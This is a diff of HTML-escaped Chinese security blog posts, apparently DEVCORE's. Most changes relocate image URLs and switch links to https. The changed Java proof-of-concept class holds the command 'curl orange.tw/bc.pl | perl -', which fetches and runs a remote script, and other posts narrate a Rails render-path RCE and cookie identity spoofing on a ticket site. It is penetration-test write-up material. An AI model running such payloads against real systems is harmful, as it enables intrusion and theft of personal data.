-    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Poc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(){&lt;/span&gt;
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Orange&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Orange&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(){&lt;/span&gt;
         &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
             &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;curl orange.tw/bc.pl | perl -&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
             &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-c&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;};&lt;/span&gt;
@@ -583,8 +864,8 @@ import org.restlet
 
 &lt;p&gt;這裡的 &lt;code class=&quot;highlighter-rouge&quot;&gt;newInstance()&lt;/code&gt; 不就代表著可以呼叫到任意類別的 &lt;code class=&quot;highlighter-rouge&quot;&gt;Constructor&lt;/code&gt; 嗎? 沒錯! 所以只需產生一個惡意的 JAR 檔，把要執行的類別全名放至 &lt;code class=&quot;highlighter-rouge&quot;&gt;META-INF/services/org.codehaus.groovy.plugins.Runners&lt;/code&gt; 中即可呼叫指定類別的&lt;code class=&quot;highlighter-rouge&quot;&gt;Constructor&lt;/code&gt; 去執行任意代碼! 完整的漏洞利用過程如下:&lt;/p&gt;
 
-&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Poc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Poc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(){&lt;/span&gt;
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Orange&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Orange&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(){&lt;/span&gt;
         &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
             &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;curl orange.tw/bc.pl | perl -&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
             &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-c&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;};&lt;/span&gt;
@@ -3795,13 +4076,13 @@ base64: invalid input&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;ul&gt;
   &lt;li&gt;您會在一個開闊的辦公環境工作&lt;br /&gt;
-&lt;img src=&quot;https://lh3.googleusercontent.com/-vBbn09CWVWk/VdNGQBIYueI/AAAAAAAAAzk/lE2DOXf-EY0/w878-h659-no/devcore_office_2.png&quot; alt=&quot;DEVCORE ENV&quot; /&gt;&lt;/li&gt;
+&lt;img src=&quot;/assets/img/blog/20150819/devcore_office_2.jpg&quot; alt=&quot;DEVCORE ENV&quot; /&gt;&lt;/li&gt;
   &lt;li&gt;您會擁有一張 Aeron 人體工學椅&lt;br /&gt;
-&lt;img src=&quot;https://lh4.googleusercontent.com/-em5Kr4jT-SQ/VdNVyj4uWQI/AAAAAAAAA0Q/-2NJx4VAwb8/w877-h581-no/devcore_aeron.jpg&quot; alt=&quot;DEVCORE AERON&quot; /&gt;&lt;/li&gt;
+&lt;img src=&quot;/assets/img/blog/20150819/devcore_aeron.jpg&quot; alt=&quot;DEVCORE AERON&quot; /&gt;&lt;/li&gt;
   &lt;li&gt;每週補滿飲料（另有咖啡機）、零食，讓您保持心情愉快&lt;br /&gt;
-&lt;img src=&quot;https://lh4.googleusercontent.com/-oMqM3oPsvhQ/VdNGQz0ZP3I/AAAAAAAAAz0/Zfj3R3yvljs/w877-h581-no/devcore_office_3.png&quot; alt=&quot;DEVCORE DRINK&quot; /&gt;&lt;/li&gt;
+&lt;img src=&quot;/assets/img/blog/20150819/devcore_office_3.jpg&quot; alt=&quot;DEVCORE DRINK&quot; /&gt;&lt;/li&gt;
   &lt;li&gt;公司提供飛鏢機讓您發洩對主管的怨氣&lt;br /&gt;
-&lt;img src=&quot;https://lh4.googleusercontent.com/-66_42C19T9U/VdNVyrU9BiI/AAAAAAAAA0M/2ZpVz9EcBRQ/w877-h581-no/devcore_dart.jpg&quot; alt=&quot;DEVCORE DART&quot; /&gt;&lt;/li&gt;
+&lt;img src=&quot;/assets/img/blog/20150819/devcore_dart.jpg&quot; alt=&quot;DEVCORE DART&quot; /&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;h3 id=&quot;員工福利&quot;&gt;員工福利&lt;/h3&gt;
@@ -3853,7 +4134,7 @@ base64: invalid input&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;從安全開發的角度來看，Ruby on Rails 是一套很友善的框架。它從框架層避免了很多過去網站常出現的安全問題，例如使用 ORM 避免大部分的 SQL injection 問題、有內建的 authenticity_token 讓開發者不必特別煩惱 CSRF、從機制面規定開發者使用 Strong Parameter 避免 Mass Assignment、預設轉化危險字元避免 XSS 等…。&lt;/p&gt;
 
-&lt;p&gt;就我們過去&lt;a href=&quot;http://devco.re/services/penetration-test&quot; title=&quot;滲透測試&quot;&gt;滲透測試&lt;/a&gt;的經驗來說，Rails 網站雖然還是能找到問題，但相對問題較少，而且很少單純因為 Rails 寫法問題拿到系統操作權。而今天要分享的，是在一次滲透測試中比較特別的例子，因為開發者使用了動態樣板路徑(Dynamic Render Paths)的寫法&lt;sup id=&quot;fnref:note1&quot;&gt;&lt;a href=&quot;#fn:note1&quot; class=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;，最後造成了嚴重的結果。&lt;/p&gt;
+&lt;p&gt;就我們過去&lt;a href=&quot;https://devco.re/services/penetration-test&quot; title=&quot;滲透測試&quot;&gt;滲透測試&lt;/a&gt;的經驗來說，Rails 網站雖然還是能找到問題，但相對問題較少，而且很少單純因為 Rails 寫法問題拿到系統操作權。而今天要分享的，是在一次滲透測試中比較特別的例子，因為開發者使用了動態樣板路徑(Dynamic Render Paths)的寫法&lt;sup id=&quot;fnref:note1&quot;&gt;&lt;a href=&quot;#fn:note1&quot; class=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;，最後造成了嚴重的結果。&lt;/p&gt;
 
 &lt;!-- more --&gt;
 
@@ -3890,19 +4171,19 @@ This is DEMO page.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;實際測試，如果我們連到 WelcomeController 的 index action，不帶任何參數會讀取 index 模版。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-NstaKpheeYU/VbHQn-6gVDI/AAAAAAAAAyg/Cb0rkZuV31o/w951-h376-no/render_index.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-NstaKpheeYU/VbHQn-6gVDI/AAAAAAAAAyg/Cb0rkZuV31o/w951-h376-no/render_index.png&quot; alt=&quot;Rails render index view&quot; title=&quot;Rails render index view&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150724/render_index.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150724/render_index.png&quot; alt=&quot;Rails render index view&quot; title=&quot;Rails render index view&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;如果帶參數 page=demo，會讀取到 demo 模版。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-8m8hUKiPDM4/VbHQpLZWF7I/AAAAAAAAAyo/xyJAW9ehQhE/w951-h376-no/render_demo.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-8m8hUKiPDM4/VbHQpLZWF7I/AAAAAAAAAyo/xyJAW9ehQhE/w951-h376-no/render_demo.png&quot; alt=&quot;Rails render demo view&quot; title=&quot;Rails render demo view&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150724/render_demo.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150724/render_demo.png&quot; alt=&quot;Rails render demo view&quot; title=&quot;Rails render demo view&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;所以，如果我們知道管理介面的模版路徑，送出路徑參數就可以讀取到管理介面。這就是 OWASP 所描述的風險，攻擊者得以讀取任意模版。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh6.googleusercontent.com/-DNSDV7HwXiQ/VbHQp5PHzVI/AAAAAAAAAyw/ceqXQZJYdCw/w951-h375-no/render_admin.png&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-DNSDV7HwXiQ/VbHQp5PHzVI/AAAAAAAAAyw/ceqXQZJYdCw/w951-h375-no/render_admin.png&quot; alt=&quot;Rails render admin view&quot; title=&quot;Rails render admin view&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150724/render_admin.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150724/render_admin.png&quot; alt=&quot;Rails render admin view&quot; title=&quot;Rails render admin view&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;然而，當我們嘗試送出系統絕對路徑例如 /etc/passwd &lt;sup id=&quot;fnref:note2&quot;&gt;&lt;a href=&quot;#fn:note2&quot; class=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;，網頁竟然吐出了 /etc/passwd 的內容！這就是之前所述的直接存取物件問題，可以遍歷目錄瀏覽檔案。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-FtPEW-Y0dlQ/VbHQrLP8A8I/AAAAAAAAAy4/lL7bRT9P57g/w781-h548-no/render_file_traversal.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-FtPEW-Y0dlQ/VbHQrLP8A8I/AAAAAAAAAy4/lL7bRT9P57g/w781-h548-no/render_file_traversal.png&quot; alt=&quot;Rails render Insecure Direct Object References&quot; title=&quot;Rails render Insecure Direct Object References&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150724/render_file_traversal.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150724/render_file_traversal.png&quot; alt=&quot;Rails render Insecure Direct Object References&quot; title=&quot;Rails render Insecure Direct Object References&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;h3 id=&quot;進階攻擊&quot;&gt;進階攻擊&lt;/h3&gt;
 
@@ -3922,7 +4203,7 @@ This is DEMO page.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;接著，我們就可以利用前面的弱點讀取 production.log 檔案，再帶一個 devcore 參數作為指令，如圖，成功取得系統操作權 :p&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-XWHiF7oruyg/VbHQsHZLN7I/AAAAAAAAAzA/azHZCbsBFBo/w729-h548-no/render_RCE.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-XWHiF7oruyg/VbHQsHZLN7I/AAAAAAAAAzA/azHZCbsBFBo/w729-h548-no/render_RCE.png&quot; alt=&quot;Rails render Remote Code Execution&quot; title=&quot;Rails render Remote Code Execution&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150724/render_RCE.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150724/render_RCE.png&quot; alt=&quot;Rails render Remote Code Execution&quot; title=&quot;Rails render Remote Code Execution&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;h3 id=&quot;風險原因&quot;&gt;風險原因&lt;/h3&gt;
 
@@ -3999,9 +4280,9 @@ This is DEMO page.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;h3 id=&quot;問題與回報&quot;&gt;問題與回報&lt;/h3&gt;
 
-&lt;p&gt;會想要聊這個議題，主要是因為最近很紅的宏碁雲端售票系統就是採用 Cookie 認證。上週在註冊該網站時看了一下 Cookie，發現該網站沒有使用 &lt;a href=&quot;http://devco.re/blog/2014/06/03/http-session-protection/&quot;&gt;Session 機制&lt;/a&gt;的跡象，也就是單純利用 Cookie 的值來認證。&lt;/p&gt;
+&lt;p&gt;會想要聊這個議題，主要是因為最近很紅的宏碁雲端售票系統就是採用 Cookie 認證。上週在註冊該網站時看了一下 Cookie，發現該網站沒有使用 &lt;a href=&quot;https://devco.re/blog/2014/06/03/http-session-protection/&quot;&gt;Session 機制&lt;/a&gt;的跡象，也就是單純利用 Cookie 的值來認證。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-9Z7DJr1KJEM/VMtTniDZ4bI/AAAAAAAAAwg/PCAa8tafZmY/w697-h489-no/acer_cookie.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-9Z7DJr1KJEM/VMtTniDZ4bI/AAAAAAAAAwg/PCAa8tafZmY/w697-h489-no/acer_cookie.png&quot; alt=&quot;宏碁雲端 cookie&quot; title=&quot;宏碁雲端 cookie&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150130/acer_cookie.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150130/acer_cookie.png&quot; alt=&quot;宏碁雲端 cookie&quot; title=&quot;宏碁雲端 cookie&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;於是開始好奇認證主要的依據是什麼？從圖中可以看到 Cookie 值並不多，猜測該網站大概會是看 USER_ID、USER_ACCOUNT 來判斷你是哪個使用者，稍作測試後會發現有些頁面只依據 USER_ACCOUNT 的值來確認身分，而 USER_ACCOUNT 這個值其實就是使用者的身分證字號，也就是說任何人只要跟網站說我的身分證字號是什麼，網站就會認為你是那個身分證字號的使用者。利用這點設計上的小瑕疵，就可以竊取他人個資，更進階一點，甚至可以用來清空別人的志願單讓其他使用者買不到票。&lt;/p&gt;
 
@@ -4016,25 +4297,25 @@ This is DEMO page.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;首先登入帳號 Z288252522，找到一個會回傳個資的頁面：&lt;br /&gt;&lt;br /&gt;
 https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh4.googleusercontent.com/-Sr6zlrJiMdQ/VMtTpyzELnI/AAAAAAAAAxA/VmWdgS82gVQ/w485-h548-no/user_A_data.png&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-Sr6zlrJiMdQ/VMtTpyzELnI/AAAAAAAAAxA/VmWdgS82gVQ/w485-h548-no/user_A_data.png&quot; alt=&quot;第一個使用者個資&quot; title=&quot;第一個使用者個資&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150130/user_A_data.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150130/user_A_data.png&quot; alt=&quot;第一個使用者個資&quot; title=&quot;第一個使用者個資&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;此時的 Cookie 值如下&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-vqjLAyXggfc/VMtTp7iHtdI/AAAAAAAAAw8/sfUXYUPC57U/w881-h548-no/user_A_cookie.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-vqjLAyXggfc/VMtTp7iHtdI/AAAAAAAAAw8/sfUXYUPC57U/w881-h548-no/user_A_cookie.png&quot; alt=&quot;第一個使用者 cookie&quot; title=&quot;第一個使用者 cookie&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150130/user_A_cookie.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150130/user_A_cookie.png&quot; alt=&quot;第一個使用者 cookie&quot; title=&quot;第一個使用者 cookie&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;從圖中發現 Cookie 的值其實是經過加密的，這點在上面說明攻擊觀念時刻意沒有提及。把 Cookie 值加密是一種防止別人修改 Cookie 值的方式，攻擊者不知道 Cookie 值的內容，自然也無法修改了。&lt;/p&gt;
 
 &lt;p&gt;然而這樣做還是存在些微風險，一旦這個加解密方式被找到，攻擊者就得以修改 Cookie 內容，進而盜用別人身分。在本例中，若想憑著改變 Cookie 盜用別人身分其實可以不用花時間去解加密法，這裡有一個小 trick，我們從觀察中馬上就能發現所有 Cookie 值都是用同一套加密方式，而且其中 USER_EMAIL、USER_NAME 這些還是我們可以修改的值。這也意味著如果我們把姓名改成我們想要加密的身分證字號，伺服器就會回傳一個加密好的值給 USER_NAME。我們直接來修改姓名看看：&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-ohhdlHt-jRQ/VMtTvHl5jjI/AAAAAAAAAxQ/Gs-5jRr_vKc/w707-h548-no/change_name.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-ohhdlHt-jRQ/VMtTvHl5jjI/AAAAAAAAAxQ/Gs-5jRr_vKc/w707-h548-no/change_name.png&quot; alt=&quot;修改姓名成身分證字號&quot; title=&quot;修改姓名成身分證字號&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;h/assets/img/blog/20150130/change_name.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150130/change_name.png&quot; alt=&quot;修改姓名成身分證字號&quot; title=&quot;修改姓名成身分證字號&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;當姓名改成目標 Z239398899 時，Cookie 中的 USER_NAME 值就會改變成我們要的加密結果。耶！是一種作業不會寫找出題老師幫忙寫的概念 XD&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh6.googleusercontent.com/-JSS4s1LR1f8/VMtTpwlQXxI/AAAAAAAAAw4/OwvKW76pqy8/w881-h548-no/user_B_cookie.png&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-JSS4s1LR1f8/VMtTpwlQXxI/AAAAAAAAAw4/OwvKW76pqy8/w881-h548-no/user_B_cookie.png&quot; alt=&quot;改變第一個使用者 cookie&quot; title=&quot;改變第一個使用者 cookie&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150130/user_B_cookie.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150130/user_B_cookie.png&quot; alt=&quot;改變第一個使用者 cookie&quot; title=&quot;改變第一個使用者 cookie&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;接著直接把 USER_NAME 的值拿來用，複製貼上到目標欄位 USER_ACCOUNT 中，之後就是以 Z239398899 的身分來讀取網頁了。我們再讀取一次 https://www.jody-ticket.com.tw/UTK0196_.aspx 看看：&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-ROUvA-9K96o/VMtTrC0U-DI/AAAAAAAAAxI/EyCpVoeQ1Kc/w485-h548-no/user_B_data.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-ROUvA-9K96o/VMtTrC0U-DI/AAAAAAAAAxI/EyCpVoeQ1Kc/w485-h548-no/user_B_data.png&quot; alt=&quot;第二個使用者個資&quot; title=&quot;第二個使用者個資&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150130/user_B_data.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150130/user_B_data.png&quot; alt=&quot;第二個使用者個資&quot; title=&quot;第二個使用者個資&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;成功看到 Z239398899 的資料了！如此，就可以只憑一個身分證字號讀到他人的地址電話資訊，甚至可以幫別人搶票或取消票券。這個流程寫成程式後只要兩個 request 就可以嘗試登入一個身分證字號，要大量偷取會員個資也是可行的了。&lt;/p&gt;
 
@@ -4063,7 +4344,7 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
 
 &lt;p&gt;關於 Cookie，這裡提供一點原則和概念供大家參考：&lt;/p&gt;
 
-&lt;p&gt;首先，Cookie 是存在客戶端的，所以有機會被看到、被竄改、被其他人偷走。基於這些原因，不建議在 Cookie 中儲存機敏資料，或是存放會影響伺服器運作的重要參數，需評估一下這些暫存資料被人家看到或修改是不是沒差，這是儲存的原則。如果權衡後還是要在 Cookie 中存放重要資料，那就需要對值加密避免被讀改，而且要確保加密的強度以及其他人是否能透過其他方法解析修改。最後，Cookie 最常被偷走的方式是透過 JavaScript，所以建議在重要的 Cookie 加上 &lt;a href=&quot;http://devco.re/blog/2014/06/11/setcookie-httponly-security-issues-of-http-headers-3/&quot;&gt;HttpOnly flag&lt;/a&gt; 能有效的降低被偷走的機率。也來試著整理一下這一小段的重點：&lt;/p&gt;
+&lt;p&gt;首先，Cookie 是存在客戶端的，所以有機會被看到、被竄改、被其他人偷走。基於這些原因，不建議在 Cookie 中儲存機敏資料，或是存放會影響伺服器運作的重要參數，需評估一下這些暫存資料被人家看到或修改是不是沒差，這是儲存的原則。如果權衡後還是要在 Cookie 中存放重要資料，那就需要對值加密避免被讀改，而且要確保加密的強度以及其他人是否能透過其他方法解析修改。最後，Cookie 最常被偷走的方式是透過 JavaScript，所以建議在重要的 Cookie 加上 &lt;a href=&quot;https://devco.re/blog/2014/06/11/setcookie-httponly-security-issues-of-http-headers-3/&quot;&gt;HttpOnly flag&lt;/a&gt; 能有效的降低被偷走的機率。也來試著整理一下這一小段的重點：&lt;/p&gt;
 
 &lt;ul class=&quot;devcore&quot;&gt;
   &lt;li&gt;機敏資料不要存&lt;/li&gt;
@@ -4094,7 +4375,7 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
 
 &lt;p&gt;江蕙引退演唱會一票難求，隔岸觀了兩天火， 也忍不住想要當個鍵盤孝子。無奈運氣不好一直連不上主機，『Service Unavailable』畫面看膩了，只好看看暫存頁面的網頁原始碼，不看還好，一看我驚呆了！&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh6.googleusercontent.com/-JiRvqxjmTc0/VK-j-wHU6-I/AAAAAAAAAwE/29JWcFB9Oo0/w878-h650-no/kham_information_leakage.png&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-JiRvqxjmTc0/VK-j-wHU6-I/AAAAAAAAAwE/29JWcFB9Oo0/w878-h650-no/kham_information_leakage.png&quot; alt=&quot;寬宏售票資訊洩漏&quot; title=&quot;寬宏售票資訊洩漏&quot; /&gt;&lt;/a&gt;&lt;br /&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150109/kham_information_leakage.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150109/kham_information_leakage.png&quot; alt=&quot;寬宏售票資訊洩漏&quot; title=&quot;寬宏售票資訊洩漏&quot; /&gt;&lt;/a&gt;&lt;br /&gt;
 （特別聲明：此流程中並無任何攻擊行為，該頁面是正常購票流程中出現的網頁）&lt;/p&gt;
 
 &lt;p&gt;在結帳網頁原始碼當中竟然看到了疑似資料庫密碼 SqlPassWord 在表單裡面！這件事從資安的角度來看，除了表面上洩漏了資料庫密碼之外，還有兩個我想講很久但苦無機會談的資安議題，分別是金流串接常見的弱點以及駭客的心理。藉著寬宏售票網頁洩漏密碼這件事情，順道與大家分享分享吧！&lt;/p&gt;
@@ -4105,7 +4386,7 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
 是不是有點多此一舉，銀行本來就會有一份鑰匙，幹嘛要請你（瀏覽器）幫忙轉交？&lt;br /&gt;&lt;br /&gt;
 如果今天壞人拿到了這把鑰匙，是不是只要繞過保全的視線，就可以打開金庫為所欲為？&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh4.googleusercontent.com/-W3tAzOTSrrk/VK-iw2tdc9I/AAAAAAAAAvY/Qtq4pzXFGmE/w640-h427-no/3d_key_to_success.jpg&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-W3tAzOTSrrk/VK-iw2tdc9I/AAAAAAAAAvY/Qtq4pzXFGmE/w640-h427-no/3d_key_to_success.jpg&quot; alt=&quot;key_to_success&quot; title=&quot;key_to_success&quot; /&gt;&lt;/a&gt;&lt;br /&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150109/3d_key_to_success.jpg&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150109/3d_key_to_success.jpg&quot; alt=&quot;key_to_success&quot; title=&quot;key_to_success&quot; /&gt;&lt;/a&gt;&lt;br /&gt;
 &lt;br /&gt;（Photo by StockMonkeys.com）&lt;/p&gt;
 
 &lt;p&gt;類似的狀況也滿常發生在電子商務與第三方金流服務的串接上。&lt;br /&gt;&lt;br /&gt;
@@ -4144,13 +4425,13 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
 
 &lt;p&gt;一般駭客基本上會不斷的從所看到的網頁資訊來調整自己攻擊的強度，如果他們不斷看到了奇怪的登入畫面：&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-hwjvY9pSsWQ/VK-iyPi36hI/AAAAAAAAAvo/lOXXP8NCU2A/w669-h372-no/kham_login_1.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-hwjvY9pSsWQ/VK-iyPi36hI/AAAAAAAAAvo/lOXXP8NCU2A/w669-h372-no/kham_login_1.png&quot; alt=&quot;寬宏售票登入頁面1&quot; title=&quot;寬宏售票登入頁面1&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150109/kham_login_1.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150109/kham_login_1.png&quot; alt=&quot;寬宏售票登入頁面1&quot; title=&quot;寬宏售票登入頁面1&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;或是防火牆的登入畫面&lt;/p&gt;
 
